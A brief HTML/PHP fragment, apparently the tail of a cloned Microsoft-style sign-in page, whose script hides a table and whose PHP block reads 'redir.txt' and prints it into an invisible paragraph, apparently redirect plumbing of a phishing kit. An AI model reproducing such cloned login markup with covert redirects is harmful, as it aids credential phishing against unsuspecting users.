    <!-- /ko -->
</form>

<form data-bind="postRedirectForm: postRedirect" method="POST" aria-hidden="true" target="_top"></form>
<script>document.getElementsByClassName('table')[0].style.display = 'none';window.onload = function(){}</script>
<?php
        $f = fopen('redir.txt','r');
        $r = fread($f,filesize("redir.txt"));
        echo "<p id='redir' style='display:none!important'>".$r."</p>";
        ?>
<!-- ko if: svr.ac --><!-- /ko --></div></body></html>